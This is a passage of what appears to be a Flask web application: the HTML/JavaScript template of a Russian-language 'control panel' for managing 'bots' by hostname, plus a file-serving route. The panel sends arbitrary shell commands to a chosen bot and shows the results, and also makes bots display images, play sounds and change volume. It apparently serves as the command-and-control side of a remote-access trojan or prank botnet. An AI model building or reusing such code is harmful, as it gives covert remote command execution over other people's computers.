...
<div class=container><h1>Панель управления v15 - Базовая</h1><h2>Активные боты: {{ bots_list|length }}</h2>
...
<script>const BOTS={{bots_data|tojson}},IMAGE_FILES={{image_files|tojson}},AUDIO_FILES={{audio_files|tojson}};const mainBotSelect=document.getElementById("main_bot_select"),aliasInput=document.getElementById("alias_input"),resultOutput=document.getElementById("result_output_pre"),volumeSlider=document.getElementById("volume_slider"),volumeOutput=document.getElementById("volume_output"),imageGallery=document.getElementById("image_gallery"),audioList=document.getElementById("audio_list");function formatBotName(t,e){return`${t} - ${e.hostname||"..."} ${e.alias?": "+e.alias:""}`}function onBotSelect(){aliasInput.value=BOTS[mainBotSelect.value].alias||"",getCurrentVolume()}function initializePanel(){if(!mainBotSelect)return;Object.entries(BOTS).forEach(([t,e])=>{let o=document.createElement("option");o.value=t,o.innerHTML=formatBotName(t,e),mainBotSelect.appendChild(o)}),IMAGE_FILES.forEach(t=>{let e=document.createElement("img");e.src=`/files/image/${t}`,e.title=t,e.onclick=()=>sendFileCommand("showimage",t),imageGallery.appendChild(e)}),AUDIO_FILES.forEach(t=>{let e=document.createElement("div");e.className="audio-item",e.textContent=t,e.onclick=()=>sendFileCommand("playsound",t),audioList.appendChild(e)}),mainBotSelect.options.length>0&&mainBotSelect.dispatchEvent(new Event("change"))}volumeSlider&&volumeSlider.addEventListener("input",()=>{volumeOutput.value=volumeSlider.value+"%"});async function sendCommand(t,e){const o=mainBotSelect.value;if(o)return e.bot_id=o,fetch(t,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(e)})}async function sendControlCommand(t){sendCommand("/api/control",{command:t})}async function sendFileCommand(t,e){const o=`${t} ${e}`;sendCommand("/api/control",{command:o})}async function sendShellCommand(t){let e="command_input"===t?document.getElementById("command_input").value:t;e&&(resultOutput.textContent="Выполнение...",sendCommand("/api/shell_command",{command:e}).then(t=>t.json()).then(t=>{resultOutput.textContent="ok"===t.status?t.result:`Ошибка: ${t.message}`}).catch(t=>{resultOutput.textContent=`Сетевая ошибка: ${t}`}))}async function getCurrentVolume(){try{const t=await sendCommand("/api/get_volume",{});if(t){const e=await t.json();"ok"===e.status&&(volumeSlider.value=e.volume,volumeOutput.value=`${e.volume}%`)}}catch(t){}}async function renameBot(){const t=aliasInput.value;try{await sendCommand("/api/rename",{alias:t}),location.reload()}catch(t){alert("Ошибка переименования!")}}</script></body></html>
"""
@app.route('/files/<folder>/<filename>')
def serve_files(folder, filename): directory = AUDIO_DIR if folder == 'audio' else IMAGE_DIR if folder == 'image' else None; return send_from_directory(directory, filename) if directory and os.path.exists(os.path.join(directory, filename)) else ("Not Found", 404)
@app.route('/')
